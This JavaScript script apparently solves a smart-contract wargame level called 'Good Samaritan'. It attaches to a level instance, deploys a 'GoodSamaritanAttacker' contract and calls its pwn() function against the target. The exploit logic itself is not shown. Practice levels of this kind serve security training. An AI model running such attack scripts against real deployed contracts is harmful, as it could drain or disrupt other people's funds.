const {BLOCK_EXPLORER_URL, GOOD_SAMARITAN_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Good Samaritan level');

    if (!GOOD_SAMARITAN_INSTANCE_ADDRESS) {
        console.log('Good Samaritan instance address not found');
        return;
    }

    console.log('Good Samaritan instance address', GOOD_SAMARITAN_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("GoodSamaritan");
    const contract = factory.attach(GOOD_SAMARITAN_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("GoodSamaritanAttacker");
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();

    const tx = await attackerContract.pwn(contract.address);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Good Samaritan level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
